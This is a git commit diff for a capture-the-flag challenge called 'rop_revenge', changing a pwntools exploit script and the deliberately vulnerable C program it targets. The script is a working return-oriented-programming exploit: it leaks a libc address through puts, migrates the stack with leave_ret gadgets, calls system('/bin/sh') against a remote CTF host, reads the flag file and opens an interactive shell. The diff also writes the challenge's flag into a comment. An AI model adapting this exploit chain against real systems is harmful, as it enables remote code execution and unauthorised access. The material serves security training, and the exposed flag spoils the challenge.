8531e55239fdccee2a17d17c43b8baea88d15463
yuan <ssspeed00@gmail.com>
2017-10-09 02:11:10 +0800

    CTF

--- rop_revenge/flag.py
+++ rop_revenge/flag.py
@@ -1,31 +1,28 @@
 #!/usr/bin/env python
 from pwn import *
 
-# 
+# AD{st4ck_m1grat10n_15_p0werfu1!!!}
 
 context.arch = 'amd64'
 
 e , l = ELF('./rop_revenge') , ELF('./libc.so.6')
 
 host , port = 'ctf.yuawn.idv.tw' , 10109
-host , port = '192.168.78.135' , 4000
 y = remote( host , port )
 
 name = 0x601080
 main = 0x400636
-pop_rdi = 0x400743
-ppr = 0x400741
+pop_rdi = 0x400723
 pop_rbp = 0x4005a0
-leave_ret = 0x4006d1
-
+leave_ret = 0x4006bd
 
 p = flat(
-    'D' * 0x200,
+    'D' * 0x40,
     pop_rdi,
     e.got['__libc_start_main'],
     e.plt['puts'],
     pop_rbp,
-    name + 0x700 + 0x20,
+    name + 0x250 + 0x20,
     0x400693,
 )
 
@@ -33,13 +30,12 @@ y.sendafter( '?' , p )
 
 p = flat(
     'D' * 0x20,
-    name + 0x200 - 8,
+    name + 0x40 - 8,
     leave_ret
 )
 
 y.sendafter( '?' , p )
 
-y.recvline()
 y.recvline()
 y.recvline()
 
@@ -51,7 +47,7 @@ p = flat(
     l.search( '/bin/sh\x00' ).next(),
     l.symbols['system'],
     0,
-    name + 0x700 - 8,
+    name + 0x250 - 8,
     leave_ret
 )
 
@@ -59,8 +55,8 @@ sleep(1)
 
 y.send( p )
 
-#y.sendafter( '?' , p )
+sleep(1)
 
-#y.sendline( 'cat /home/`whoami`/flag' )
+y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
--- rop_revenge/home/rop_revenge.c
+++ rop_revenge/home/rop_revenge.c
@@ -1,12 +1,12 @@
 #include<stdio.h>
 
-char name[0x700];
+char name[0x280];
 
 int main(){
     setvbuf(stdout,0,2,0);
     puts( "What your name?" );
 
-    read( 0 , name , 0x700 );
+    read( 0 , name , 0x280 );
     printf( "Hello! %s\nWhat do you want to say?\n" , name );
 
     
